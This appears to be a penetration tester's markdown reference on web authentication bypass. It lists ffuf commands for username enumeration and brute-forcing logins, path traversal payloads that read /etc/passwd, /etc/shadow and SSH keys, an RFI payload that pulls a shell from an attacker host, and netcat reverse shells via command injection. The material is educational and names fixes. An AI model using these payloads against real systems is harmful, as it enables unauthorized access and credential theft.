# Web Authentication Bypass

Common web application attacks for bypassing authentication and accessing data or resources that should be protected.

## Why It Matters

Authentication and access control are where web applications most often fail. The techniques here (enumerating users, tampering with sessions, and abusing how the app references files and resources) are the staples of web testing and frequently lead directly to unauthorized access.

## Reference

### Username Enumeration

Applications that respond differently to valid and invalid usernames (at sign-up, login, or password reset) leak which accounts exist. Fuzz the field with [ffuf](https://github.com/ffuf/ffuf) and match on the tell-tale response:

```bash
ffuf -w names.txt -X POST \
  -d "username=FUZZ&email=x&password=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://VICTIM/sign-up -mr "username already exists"
```

### Brute Forcing

With valid usernames, test them against a password list. ffuf supports two wordlists at once:

```bash
ffuf -w valid_users.txt:W1,passwords.txt:W2 -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://VICTIM/login -fc 200
```

### Logic Flaws

When the intended flow of an application can be bypassed or manipulated. A classic example is a password-reset form that trusts a client-supplied email, letting an attacker redirect another user's reset to their own address. Test by changing which fields you control and watching what the app accepts.

### Cookie Tampering

Session cookies that encode state (such as `admin=false`) can sometimes be edited to change it. Values are often base64 or hashed; [CyberChef](https://gchq.github.io/CyberChef/) and [CrackStation](https://crackstation.net/) help decode or crack them. The fix is signed, server-side sessions.

### IDOR (Insecure Direct Object Reference)

When an app exposes a reference to an object (a file, record, or ID) and does not check that the current user is allowed to access it. Changing `profile?id=1` to `profile?id=100` and seeing another user's data is the canonical example. Test by manipulating IDs, including ones that are base64- or hash-encoded.

### Path Traversal

Manipulating a file path parameter to read files outside the intended directory, using `../` sequences:

```text
http://webapp/get.php?file=../../../../etc/passwd
http://webapp/get.php?file=../../../../windows/win.ini
```

| File | Why It Is Useful |
| :--- | :--- |
| `/etc/passwd` | Registered users |
| `/etc/shadow` | Password hashes (if readable) |
| `/root/.ssh/id_rsa` | Private SSH keys |
| `/var/log/apache2/access.log` | Request history (log poisoning) |
| `C:\boot.ini`, `C:\windows\win.ini` | Windows equivalents |

### Local and Remote File Inclusion (LFI / RFI)

Where a page includes a file based on user input (common with PHP `include`). LFI includes a local file (`index.php?lang=../../../../etc/passwd`); RFI includes a remote one when `allow_url_fopen` is enabled (`index.php?lang=http://attacker/shell.txt`), which can lead to code execution.

### Server-Side Request Forgery (SSRF)

Making the server send a request of the attacker's choosing, often to reach internal services it can access but the attacker cannot. Blind SSRF (no response returned) is confirmed with an out-of-band tool such as Burp Collaborator. A typical case redirects an API parameter from an internal stock URL to `http://localhost/admin`.

### Command Injection

Abusing an application that passes user input into a system command. Shell operators (`;`, `&`, `&&`) chain an injected command onto the intended one. Test with low-impact payloads first:

| Payload | Purpose |
| :--- | :--- |
| `whoami` | Which user the app runs as |
| `ls` / `dir` | List the current directory |
| `ping` / `sleep` / `timeout` | Detect blind injection via a delay |
| `nc` | Spawn a reverse shell (where in scope) |

## How I Use It

I map the app's authentication and access control first, then work through these techniques roughly in order of likelihood: username enumeration and IDOR tend to pay off fastest, and path traversal, LFI, and command injection carry the highest impact when present. Each finding goes in the report with the specific fix (server-side session validation, access checks, parameterization, input allowlisting).

## Related

* [SQL Injection](sql-injection.md), [XSS](xss.md)
* [Web Application Recon](../reconnaissance/web-application-recon.md)
* [Burp Suite](burp-suite.md), [OWASP ZAP](owasp-zap.md)

## Resources

* [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
* [PortSwigger Web Security Academy](https://portswigger.net/web-security)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
